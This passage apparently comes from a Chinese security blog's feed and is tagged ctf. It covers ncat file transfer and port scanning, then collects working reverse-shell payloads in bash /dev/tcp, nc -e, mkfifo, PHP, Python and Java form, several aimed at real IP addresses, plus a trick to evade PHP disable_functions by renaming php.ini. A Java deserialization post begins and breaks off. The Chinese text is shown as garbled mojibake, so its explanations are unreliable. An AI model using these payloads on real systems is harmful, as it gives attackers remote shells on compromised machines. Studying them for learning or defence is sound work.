title="ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶"></a>ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶</h4><p>root@Slothè¿œç¨‹æœåŠ¡å™¨è¿è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l 3344 &lt; hello.txt </span><br></pre></td></tr></table></figure></div><p>macOS æœ¬åœ°è¿è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 124.223.207.184 3344 &gt; hello.txt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255056.jpg"                      alt="image-20220926011518092"                ><figcaption>image-20220926011518092</figcaption></figure></p><blockquote><p>è¿™é‡Œæ–‡ä»¶ä¼ è¾“å®Œæˆåä¸ä¼šæ˜¾ç¤ºä»»ä½•å†…å®¹ï¼Œå¹¶ä¸”ä¸¤ä¸ª Ncat å®ä¾‹å°†ç»§ç»­å·¥ä½œ(ä½†ä¸èƒ½æ–‡å­—å’Œå‘½ä»¤äº¤äº’)</p></blockquote><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>ncat ä¸æ”¯æŒç«¯å£èŒƒå›´æ‰«æï¼Œä½†æ˜¯åŸå§‹çš„ nc (macä¸Šå¯ä»¥ç”¨brewè£…netcat)å¯ä»¥æ‰«æç«¯å£</p><ul><li><h4 id="èŒƒå›´æ‰«æ"><a href="#èŒƒå›´æ‰«æ" class="headerlink" title="èŒƒå›´æ‰«æ"></a>èŒƒå›´æ‰«æ</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255349.jpg"                      alt="image-20220926012145161"                ><figcaption>image-20220926012145161</figcaption></figure></p><blockquote><p><code>-n</code>: ç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨<br><code>-z</code>: ä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼%ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</p></blockquote></li><li><h4 id="å•ä¸ªæ‰«æ"><a href="#å•ä¸ªæ‰«æ" class="headerlink" title="å•ä¸ªæ‰«æ"></a>å•ä¸ªæ‰«æ</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255336.jpg"                      alt="image-20220926012300304"                ><figcaption>image-20220926012300304</figcaption></figure></p></li></ul><h3 id="vps-ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› "><a href="#vps-ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› " class="headerlink" title="vps ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› "></a>vps ncæœ¬æœºå¤±è´¥å¯èƒ½åŸå› </h3><ul><li><p>æœ¬æœºæœªç›‘å¬ï¼Œtcpè¿æ¥è¦è®©æœ¬æœºå…ˆåœ¨å¯¹åº”ç«¯å£ç›‘å¬æ‰èƒ½å»ºç«‹ï¼Œè€Œudpä¸ç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬å›æ˜¾</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ncat: Connection refused.</span><br></pre></td></tr></table></figure></div><p>å¦‚æœä½¿ç”¨åŸå§‹ncï¼Œåˆ™è¡¨ç°ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œå‘½ä»¤ç›´æ¥ç»“æŸ</p></li><li><p>ç«¯å£æœªæ”¾è¡Œ:ä¸€èˆ¬å›æ˜¾è¡¨ç°ä¸º</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ncat: TIMEOUT.</span><br><span class="line">æˆ–</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure></div><p>å¦‚æœä½¿ç”¨åŸå§‹ncåˆ™æ˜¯ç­‰å¾…è¾ƒé•¿æ—¶é—´ï¼Œå‘½ä»¤ç»“æŸï¼Œæ²¡æœ‰å›æ˜¾</p></li><li><p>ä½¿ç”¨çš„æœ¬æœºipä¸æ˜¯å…¬ç½‘ip</p></li><li><p>ç»æµ‹è¯•ï¼Œå¯èƒ½æ˜¯å› ä¸ºç«¯å£æœªæ”¾è¡Œï¼Œè¿™å¯èƒ½éœ€è¦é…ç½®è·¯ç”±å™¨çš„é˜²ç«å¢™</p></li></ul><h3 id="å¸¸è§options"><a href="#å¸¸è§options" class="headerlink" title="å¸¸è§options"></a>å¸¸è§options</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l å¯åŠ¨ç›‘å¬</span><br><span class="line">-p&lt;ç«¯å£å·&gt; è¡¨ç¤ºæŒ‡å®šç«¯å£</span><br><span class="line">-v æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹</span><br><span class="line">-u udpè¿æ¥</span><br><span class="line">-n ç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œä¸ç”¨åŸŸåè§£æ</span><br><span class="line">-w&lt;è¶…æ—¶ç§’æ•°&gt;   è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´</span><br><span class="line">-z  ä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</span><br></pre></td></tr></table></figure></div><h2 id="åå¼¹Shell"><a href="#åå¼¹Shell" class="headerlink" title="åå¼¹Shell"></a>åå¼¹Shell</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>vpsç›‘å¬æŸä¸ªç«¯å£ï¼Œè¢«æ§åˆ¶ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºä¼ åˆ°æ§åˆ¶ç«¯</p><h3 id="å†…ç½‘å¼¹shell"><a href="#å†…ç½‘å¼¹shell" class="headerlink" title="å†…ç½‘å¼¹shell"></a>å†…ç½‘å¼¹shell</h3><p>ncatçš„-e ç»è¿‡ç®€å•è°ƒæ•´ï¼Œå¯ä»¥è®©vpsä¸å†…ç½‘æœºå™¨è¿›è¡Œå‘½ä»¤äº¤äº’</p><p>root@Slothå…ˆç›‘å¬</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp 3344</span><br></pre></td></tr></table></figure></div><p>å†…ç½‘çš„ macOS è¿è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -w 10 -e /bin/bash 124.221.124.106 3344</span><br></pre></td></tr></table></figure></div><p>Linux</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  124.221.124.106 3344 -e /bin/sh</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255233.jpg"                      alt="image-20220926013811064"                ><figcaption>image-20220926013811064</figcaption></figure></p><blockquote><p>å¦‚æœç›®æ ‡ä¸»æœºlinuxå‘è¡Œç‰ˆæœ¬æ²¡æœ‰ -e å‚æ•°ï¼Œè¿˜æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg"                      alt="image-20220927000457356"                ><figcaption>image-20220927000457356</figcaption></figure></p><ul><li><code>rm /tmp/f</code> åˆ é™¤å‘½ä»¤</li><li><code>mkfifo /tmp/f;</code> åœ¨tmpç›®å½•ä¸‹å†™fifoæ–‡ä»¶f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> å°†&#x2F;bin&#x2F;bash çš„æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>å°†ncç›‘å¬åˆ°çš„è¾“å…¥ è¾“å…¥åˆ°fifo</li><li><code>cat /tmp/f</code> å°†æ‰§è¡Œç»“æœå›æ˜¾</li></ul></blockquote><h3 id="bashå¼¹shell"><a href="#bashå¼¹shell" class="headerlink" title="bashå¼¹shell"></a>bashå¼¹shell</h3><p>è¿™ä¹Ÿæ˜¯å¸¸ç”¨çš„åå¼¹shell payload</p><p>âš ï¸æ³¨æ„ï¼šjavaå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®ç©ºæ ¼åˆ†å‰²å‚æ•°ã€‚å› æ­¤æœ€å¥½ä¸è¦ç›´æ¥ä¼ ç±»ä¼¼ä¸‹é¢ç¬¬äºŒæ¡è¿™ç§</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #é€‚ç”¨sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">é€‚é…javaçš„</span></span><br><span class="line">String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(s);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255967.jpg"                      alt="image-20220927204310944"                ><figcaption>image-20220927204310944</figcaption></figure></p><table><thead><tr><th>å‘½ä»¤</th><th>å‚æ•°è§£é‡Š</th></tr></thead><tbody><tr><td>bash -i</td><td>äº§ç”Ÿä¸€ä¸ª bash äº¤äº’ç¯å¢ƒ</td></tr><tr><td>&gt;&amp;</td><td>å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç»“åˆç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>æ‰“å¼€<code>/dev/tcp</code>è¿™ä¸ªæ–‡ä»¶å°±ç±»ä¼¼äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥,åé¢è·Ÿç›®æ ‡ipå’Œç›®æ ‡ç«¯å£</td></tr><tr><td>0&gt;&amp;1</td><td>ä½¿å¾—æ”»å‡»æ–¹å¯ä»¥çœ‹åˆ°è¾“å…¥åˆ°å‘½ä»¤ä»¥åŠæ‰§è¡Œç»“æœ</td></tr></tbody></table><blockquote><ul><li><p>å…¶å®<code>/dev/tcp</code>åœ¨æ ¹ç›®å½•ä¸‹å¹¶ä¸å­˜åœ¨ï¼Œä¹‹æ‰€ä»¥èƒ½åœ¨å‘½ä»¤ä¸­ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºbashæºç å¯¹å…¶åšäº†ç›¸å…³é¢„å®šä¹‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255199.jpg"                      alt="image-20220926171832801"                ><figcaption>image-20220926171832801</figcaption></figure></p></li><li><p>å¦‚æœæ”»å‡»ç›®æ ‡æ˜¯mac osç³»ç»Ÿï¼Œä½¿ç”¨å†…ç½‘å¼¹shellçš„payloadå¯ä»¥æˆåŠŸï¼Œbashå¼¹shellçš„payloadå¯èƒ½å¤±è´¥</p><ul><li><p>åŸå› ï¼šç°åœ¨çš„macéƒ½å·²ç»ä½¿ç”¨zshä½œä¸ºé»˜è®¤shellï¼Œè€Œzshå¹¶æ²¡æœ‰å¯¹<code>/dev/tcp</code>åšç›¸å…³å¤„ç†ï¼Œæ‰§è¡Œpayloadä¼šå›æ˜¾</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333</span><br></pre></td></tr></table></figure></div></li><li><p>å¦‚æœè¦ä½¿ç”¨bashå¼¹shellè¦å…ˆåˆ‡æ¢å½“å‰ä½¿ç”¨shellï¼Œå¯ä»¥<code>sudo su</code>è¾“å…¥å½“å‰ç”¨æˆ·å¯†ç åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œé»˜è®¤ä½¿ç”¨sh</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310256550.jpg"                      alt="image-20220926172537373"                ><figcaption>image-20220926172537373</figcaption></figure></p></li><li><p>æˆ–è€…æ›´æ”¹shellä¸ºbash</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash</span><br></pre></td></tr></table></figure></div></li></ul></li></ul></blockquote><h4 id="å…¶ä»–å½¢å¼"><a href="#å…¶ä»–å½¢å¼" class="headerlink" title="å…¶ä»–å½¢å¼"></a>å…¶ä»–å½¢å¼</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>ç¬¬ä¸€æ¡å‘½ä»¤ å»ºç«‹ä¸x.x.x.x:4444çš„tcpè¿æ¥ï¼Œå¹¶å°†æ ‡å‡†è¾“å…¥è¾“å‡ºä½œä¸ºdevice 5çš„æ ‡å‡†è¾“å…¥è¾“å‡º</li><li>ç¬¬äºŒæ¡cat &lt;&amp;5 è·å–device5çš„è¾“å…¥; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> ä¸€æ—¦è·å–åˆ°å‘½ä»¤ä¾¿è¿è¡Œ ç„¶åå°†æ ‡å‡†è¾“å…¥è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°device5ä¸­</li></ul></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310256792.jpg"                      alt="image-20220926224353002"                ><figcaption>image-20220926224353002</figcaption></figure></p><h3 id="åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell"><a href="#åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell" class="headerlink" title="åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell"></a>åŸºäºç¼–ç¨‹è¯­è¨€çš„åå¼¹shell</h3><p>1ã€åŸºäºPHPçš„åå¼¹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure></div><p>2ã€åŸºäºpythonåå¼¹shell</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä½¿ç”¨socketå»ºç«‹èµ·tcpè¿æ¥</p><p>os.dup2() æ–¹æ³•ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fd å¤åˆ¶åˆ°å¦ä¸€ä¸ª fd2ï¼Œè¿™é‡Œå°†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯éƒ½é›†æˆåˆ°å½“å‰socketçš„æ–‡ä»¶æè¿°ç¬¦ä¸Š,ç„¶åå†äº§ç”Ÿä¸€ä¸ª bash äº¤äº’ç¯å¢ƒ</p></blockquote><p>2ã€å—åˆ°disable_functionså½±å“ï¼Œå¯¼è‡´fsockopenæˆ–è€…execä¸å¯ç”¨ã€‚<br>å½“ç›‘å¬ç«¯æ”¶ä¸åˆ°è¿æ¥å°±æ˜¯fsockopenè¢«ç¦ç”¨ï¼Œåˆæˆ–è€…æ”¶åˆ°è¿æ¥ååˆç«‹é©¬æ–­å¼€åˆ™æ˜¯execè¢«ç¦ç”¨<br>è§£å†³æ–¹æ³•ï¼š<br>phpåœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œæ—¶ä¿®æ”¹ php.ini æ˜¯ç«‹å³ç”Ÿæ•ˆçš„ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥é‡å‘½åphp.iniæ–‡ä»¶å³å¯:</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/php.ini /etc/php.ini.bak</span><br></pre></td></tr></table></figure></div><p>å½“ç„¶ï¼Œæ–‡ä»¶ä½ç½®å¹¶ä¸æ˜¯ä¸€å®šåœ¨è¿™é‡Œã€‚å¯ä»¥æŠŠå¸¸ç”¨ä½ç½®éƒ½è¯•ä¸€éã€‚å½“ç„¶äº†ï¼Œå®æˆ˜ä¸­å¯åƒä¸‡ä¸è¦è¿™ä¹ˆæï¼Œä¸šåŠ¡çƒ‚äº†å°±å‘œå‘œå‘œäº†ã€‚</p><p>å‚è€ƒåšå®¢:</p><ol><li><a class="link"   href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa" >åå¼¹shellåŸç† <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://www.sqlsec.com/2019/10/nc.html" >ncå‘½ä»¤æ•™ç¨‹ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> shell </tag>
            
            <tag> nc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–</title>
      <link href="/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h1><h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p><code>Java</code>ç›¸å¯¹<code>PHP</code>åºåˆ—åŒ–æ›´æ·±å…¥çš„åœ°æ–¹åœ¨äºï¼Œå…¶æä¾›äº†æ›´åŠ é«˜çº§ã€çµæ´»åœ°æ–¹æ³• <code>writeObject</code> ï¼Œå…è®¸å¼€å‘è€…åœ¨åºåˆ—åŒ–æµä¸­æ’å…¥ä¸€äº›è‡ªå®šä¹‰æ•°æ®ï¼Œè¿›è€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½å¤Ÿä½¿ç”¨ <code>readObject</code> è¿›è¡Œè¯»å–ã€‚</p><p><code>Java</code>è®¾è®¡ <code>readObject</code> çš„æ€è·¯å’Œ<code>PHP</code>çš„ <code>__wakeup</code> ä¸åŒç‚¹åœ¨äºï¼š <code>readObject</code> å€¾å‘äºè§£å†³â€ååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€Œ<code>PHP</code>çš„ <code>__wakeup</code> æ›´å€¾å‘äºè§£å†³â€œååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡â€çš„é—®é¢˜ã€‚</p><p>åœ¨Javaä¸­å®ç°å¯¹è±¡ååºåˆ—åŒ–éå¸¸ç®€å•ï¼Œå®ç°<code>java.io.Serializable(å†…éƒ¨åºåˆ—åŒ–)</code>æˆ–<code>java.io.Externalizable(å¤–éƒ¨åºåˆ—åŒ–)</code>æ¥å£å³å¯è¢«åºåˆ—åŒ–ï¼Œå…¶ä¸­<code>java.io.Externalizable</code>æ¥å£åªæ˜¯å®ç°äº†<code>java.io.Serializable</code>æ¥å£ã€‚</p><p>ååºåˆ—åŒ–ç±»å¯¹è±¡æ—¶æœ‰å¦‚ä¸‹é™åˆ¶ï¼š</p><ol><li>è¢«ååºåˆ—åŒ–çš„ç±»å¿…é¡»å­˜åœ¨ã€‚</li><li><code>serialVersionUID</code>å€¼å¿…é¡»ä¸€è‡´ã€‚</li></ol><h2 id="ObjectInputStreamã€ObjectOutputStream"><a href="#ObjectInputStreamã€ObjectOutputStream" class="headerlink" title="ObjectInputStreamã€ObjectOutputStream"></a>ObjectInputStreamã€ObjectOutputStream</h2><p><code>java.io.ObjectOutputStream</code>ç±»æœ€æ ¸å¿ƒçš„æ–¹æ³•æ˜¯<code>writeObject</code>æ–¹æ³•ï¼Œå³åºåˆ—åŒ–ç±»å¯¹è±¡ã€‚</p><p><code>java.io.ObjectInputStream</code>ç±»æœ€æ ¸å¿ƒçš„åŠŸèƒ½æ˜¯<code>readObject</code>æ–¹æ³•ï¼Œå³ååºåˆ—åŒ–ç±»å¯¹è±¡ã€‚</p><p>æ‰€ä»¥ï¼Œåªéœ€å€ŸåŠ©<code>ObjectInputStream</code>å’Œ<code>ObjectOutputStream</code>ç±»æˆ‘ä»¬å°±å¯ä»¥å®ç°ç±»çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åŠŸèƒ½äº†ã€‚</p><h3 id="ååºåˆ—åŒ–æ¥å£"><a href="#ååºåˆ—åŒ–æ¥å£" class="headerlink" title="ååºåˆ—åŒ–æ¥å£"></a>ååºåˆ—åŒ–æ¥å£</h3><p>javaä¸­çš„unserializableæ¥å£æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å®ç°è¯¥æ¥å£ä¸ç”¨é‡å†™ä»€ä¹ˆæ–¹æ³•</p><blockquote><ul><li><p>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç»•è¿‡å®ƒçš„çˆ¶ç±»æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆè¦æé«˜æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡</p></li><li><p>ä¸€ä¸ªå®ç°Serializableæ¥å£çš„å­ç±»ä¹Ÿå¯ä»¥è¢«åºåˆ—åŒ–</p></li><li><p>å®ç°äº†<strong>Serializable</strong>æˆ–è€… <strong>Externalizable</strong>æ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—</p></li><li><p>é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–ï¼ˆåºåˆ—åŒ–é’ˆå¯¹å¯¹è±¡å±æ€§ï¼‰</p></li><li><h5 id="transient-æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–"><a href="#transient-æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–" class="headerlink" title="transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–"></a>transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</h5></li></ul></blockquote><h3 id="java-io-Serializable"><a href="#java-io-Serializable" class="headerlink" title="java.io.Serializable"></a>java.io.Serializable</h3><p>è¿™æ˜¯ä¸€ä¸ªç©ºçš„æ¥å£ï¼ŒæŸä¸ªç±»å®ç°äº†è¯¥æ¥å£å¯ä»¥æ ‡è¯†è¯¥ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ä¸éœ€è¦å®ç°<code>java.io.Serializable</code>çš„ä»»ä½•æ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®ç°äº†<code>java.io.Serializable</code>æ¥å£çš„ç±»åŸåˆ™ä¸Šéƒ½éœ€è¦ç”Ÿäº§ä¸€ä¸ª<code>serialVersionUID</code>å¸¸é‡ï¼Œååºåˆ—åŒ–æ—¶å¦‚æœåŒæ–¹çš„<code>serialVersionUID</code>ä¸ä¸€è‡´ä¼šå¯¼è‡´<code>InvalidClassException</code> å¼‚å¸¸ï¼Œå¦‚æœå¯åºåˆ—åŒ–ç±»æœªæ˜¾å¼å£°æ˜ <code>serialVersionUID</code>ï¼Œåˆ™åºåˆ—åŒ–è¿è¡Œæ—¶å°†åŸºäºè¯¥ç±»çš„å„ä¸ªæ–¹é¢è®¡ç®—è¯¥ç±»çš„é»˜è®¤ <code>serialVersionUID</code>å€¼ã€‚</p><p><code>DeserializationTest.java</code>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.serializes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span 